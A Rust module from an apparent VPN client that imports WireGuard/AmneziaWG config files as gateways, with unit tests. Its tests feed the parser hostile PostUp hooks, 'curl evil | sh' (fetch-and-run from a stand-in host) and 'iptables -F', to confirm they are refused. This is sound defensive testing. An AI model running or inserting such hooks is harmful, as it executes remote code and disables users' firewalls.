//! Import of standard WireGuard / AmneziaWG `.conf` files as gateways.
//!
//! Works with any provider that hands out WireGuard configs (Proton VPN,
//! Mullvad, IVPN, Surfshark, Windscribe, self-hosted servers, ...). The DNS
//! line is ignored on purpose: VoidWire always answers DNS from its encrypted
//! vault, so a provider's resolver never sees your queries outside it.

use std::net::{IpAddr, Ipv4Addr, Ipv6Addr};

use crate::config::{
    AmneziaParams, Bytes32, Endpoint, NodeDescriptor, NodeKind, NodeRole, TransportKind,
};
use crate::error::{Result, VwError};
use crate::secret::Key32;

/// Parse a `.conf` file into a gateway named `name` (optional ISO country).
pub fn parse(text: &str, name: &str, country: Option<&str>) -> Result<NodeDescriptor> {
    let name = name.trim();
    if name.is_empty() || name.len() > 64 {
        return Err(VwError::Config(
            "gateway name must be 1-64 characters".into(),
        ));
    }
    let country = match country.map(str::trim).filter(|c| !c.is_empty()) {
        Some(c) if c.len() == 2 && c.chars().all(|ch| ch.is_ascii_alphabetic()) => {
            Some(c.to_ascii_uppercase())
        }
        Some(_) => {
            return Err(VwError::Config(
                "country must be a 2-letter code like US".into(),
            ))
        }
        None => None,
    };

    #[derive(PartialEq)]
    enum Sec {
        None,
        Interface,
        Peer,
    }
    let mut sec = Sec::None;
    let mut peers = 0usize;
    let mut private: Option<Key32> = None;
    let mut v4: Option<Ipv4Addr> = None;
    let mut v6: Option<Ipv6Addr> = None;
    let mut public: Option<Bytes32> = None;
    let mut psk: Option<Key32> = None;
    let mut endpoint: Option<(String, u16)> = None;
    let mut allowed_v6_default = false;
    let mut awg = [None::<u32>; 9]; // Jc Jmin Jmax S1 S2 H1 H2 H3 H4

    for (lineno, raw) in text.lines().enumerate() {
        let line = raw.split(['#', ';']).next().unwrap_or("").trim();
        if line.is_empty() {
            continue;
        }
        let err = |m: &str| VwError::Config(format!("line {}: {m}", lineno + 1));
        if line.starts_with('[') {
            sec = match line.to_ascii_lowercase().as_str() {
                "[interface]" => Sec::Interface,
                "[peer]" => {
                    peers += 1;
                    Sec::Peer
                }
                _ => return Err(err("unknown section")),
            };
            continue;
        }
        let (k, v) = line
            .split_once('=')
            .ok_or_else(|| err("expected Key = Value"))?;
        let (k, v) = (k.trim().to_ascii_lowercase(), v.trim());
        match (&sec, k.as_str()) {
            (Sec::Interface, "privatekey") => {
                private = Some(Key32::from_base64(v).ok_or_else(|| err("invalid PrivateKey"))?)
            }
            (Sec::Interface, "address") => {
                for a in v.split(',') {
                    let ip = a.trim().split('/').next().unwrap_or("");
                    match ip.parse::<IpAddr>() {
                        Ok(IpAddr::V4(x)) if v4.is_none() => v4 = Some(x),
                        Ok(IpAddr::V6(x)) if v6.is_none() => v6 = Some(x),
                        Ok(_) => {}
                        Err(_) => return Err(err("invalid Address")),
                    }
                }
            }
            (Sec::Interface, "dns" | "mtu" | "listenport" | "table" | "fwmark") => {}
            (Sec::Interface, "preup" | "postup" | "predown" | "postdown") => {
                return Err(err(
                    "configs with shell hooks (PostUp etc.) are refused for safety",
                ))
            }
            (Sec::Interface, key) => {
                let idx = ["jc", "jmin", "jmax", "s1", "s2", "h1", "h2", "h3", "h4"]
                    .iter()
                    .position(|x| *x == key)
                    .ok_or_else(|| err("unknown Interface key"))?;
                awg[idx] = Some(v.parse().map_err(|_| err("invalid AmneziaWG number"))?);
            }
            (Sec::Peer, _) if peers > 1 => {
                return Err(VwError::Config(
                    "configs with more than one [Peer] are not supported".into(),
                ))
            }
            (Sec::Peer, "publickey") => {
                public = Some(Bytes32::from_base64(v).ok_or_else(|| err("invalid PublicKey"))?)
            }
            (Sec::Peer, "presharedkey") => {
                psk = Some(Key32::from_base64(v).ok_or_else(|| err("invalid PresharedKey"))?)
            }
            (Sec::Peer, "endpoint") => {
                let (host, port) = v
                    .rsplit_once(':')
                    .ok_or_else(|| err("Endpoint needs host:port"))?;
                let port: u16 = port.parse().map_err(|_| err("invalid Endpoint port"))?;
                let host = host.trim_matches(|c| c == '[' || c == ']').to_string();
                if host.is_empty() || host.contains(char::is_whitespace) {
                    return Err(err("invalid Endpoint host"));
                }
                endpoint = Some((host, port));
            }
            (Sec::Peer, "allowedips") => {
                allowed_v6_default |= v.split(',').any(|a| a.trim() == "::/0");
            }
            (Sec::Peer, "persistentkeepalive") => {}
            (Sec::Peer, _) => return Err(err("unknown Peer key")),
            (Sec::None, _) => return Err(err("key outside a section")),
        }
    }

    let private =
        private.ok_or_else(|| VwError::Config("missing [Interface] PrivateKey".into()))?;
    let public = public.ok_or_else(|| VwError::Config("missing [Peer] PublicKey".into()))?;
    let (host, port) = endpoint.ok_or_else(|| VwError::Config("missing [Peer] Endpoint".into()))?;
    if v4.is_none() && v6.is_none() {
        return Err(VwError::Config("missing [Interface] Address".into()));
    }
    let amnezia = if awg.iter().any(Option::is_some) {
        let g = |i: usize| awg[i].unwrap_or(0);
        let p = AmneziaParams {
            jc: g(0).min(u8::MAX as u32) as u8,
            jmin: g(1).min(u16::MAX as u32) as u16,
            jmax: g(2).min(u16::MAX as u32) as u16,
            s1: g(3).min(u16::MAX as u32) as u16,
            s2: g(4).min(u16::MAX as u32) as u16,
            h1: awg[5].unwrap_or(1),
            h2: awg[6].unwrap_or(2),
            h3: awg[7].unwrap_or(3),
            h4: awg[8].unwrap_or(4),
        };
        p.validate()?;
        Some(p)
    } else {
        None
    };
    let n = NodeDescriptor {
        version: 1,
        name: name.to_string(),
        kind: NodeKind::Generic,
        role: NodeRole::Both,
        wg_public_key: public,
        identity_key: None,
        endpoints: vec![Endpoint {
            transport: if amnezia.is_some() {
                TransportKind::AmneziaWg
            } else {
                TransportKind::NativeUdp
            },
            host,
            port,
            sni: None,
            path: None,
            cert_sha256: None,
        }],
        amnezia,
        country,
        ipv6_exit: v6.is_some() && allowed_v6_default,
        static_v4: v4,
        static_v6: v6,
        reserved: None,
        static_psk: psk,
        token_keys: Vec::new(),
        client_private: Some(private),
    };
    n.validate()?;
    Ok(n)
}

#[cfg(test)]
mod tests {
    use super::*;

    const PROTON: &str = "# Proton VPN style\n[Interface]\nPrivateKey = oEJ6LbbHkTYUrkyfLvG0UBHgm7KoqHg3lbVHXrSf5Vk=\nAddress = 10.2.0.2/32\nDNS = 10.2.0.1\n\n[Peer]\n# US-FREE#1\nPublicKey = bmXOC+F1FxEMF9dyiK2H5/1SUtzH0JuVo51h2wPfgyo=\nAllowedIPs = 0.0.0.0/0, ::/0\nEndpoint = 192.0.2.44:51820\n";

    #[test]
    fn parses_standard_config() {
        let n = parse(PROTON, "Proton US", Some("us")).unwrap();
        assert_eq!(n.kind, NodeKind::Generic);
        assert_eq!(n.country.as_deref(), Some("US"));
        assert_eq!(n.static_v4, Some(Ipv4Addr::new(10, 2, 0, 2)));
        assert_eq!(n.endpoints[0].port, 51820);
        assert_eq!(n.endpoints[0].transport, TransportKind::NativeUdp);
        assert!(n.client_private.is_some());
        assert!(!n.ipv6_exit);
        assert!(!n.supports_pq());
        // Round-trips through storage.
        let j = serde_json::to_string(&n).unwrap();
        let back: NodeDescriptor = serde_json::from_str(&j).unwrap();
        assert_eq!(back, n);
    }

    #[test]
    fn parses_amnezia_and_ipv6() {
        let conf = PROTON.replace(
            "DNS = 10.2.0.1",
            "Address = fd00::2/128\nJc = 4\nJmin = 40\nJmax = 70\nS1 = 20\nS2 = 30\nH1 = 11\nH2 = 22\nH3 = 33\nH4 = 44",
        );
        let n = parse(&conf, "AWG", None).unwrap();
        assert_eq!(n.endpoints[0].transport, TransportKind::AmneziaWg);
        assert_eq!(n.amnezia.unwrap().h4, 44);
        assert!(n.ipv6_exit);
    }

    #[test]
    fn rejects_bad_configs() {
        assert!(parse(PROTON, "", None).is_err());
        assert!(parse(PROTON, "x", Some("USA")).is_err());
        assert!(parse(&PROTON.replace("PrivateKey", "#"), "x", None).is_err());
        assert!(parse(&format!("{PROTON}PostUp = curl evil | sh\n"), "x", None).is_err());
        let hook = PROTON.replace("DNS = 10.2.0.1", "PostUp = iptables -F");
        assert!(parse(&hook, "x", None).is_err());
        let two =
            format!("{PROTON}\n[Peer]\nPublicKey = bmXOC+F1FxEMF9dyiK2H5/1SUtzH0JuVo51h2wPfgyo=\n");
        assert!(parse(&two, "x", None).is_err());
        assert!(parse(&PROTON.replace("192.0.2.44:51820", "192.0.2.44"), "x", None).is_err());
    }
}
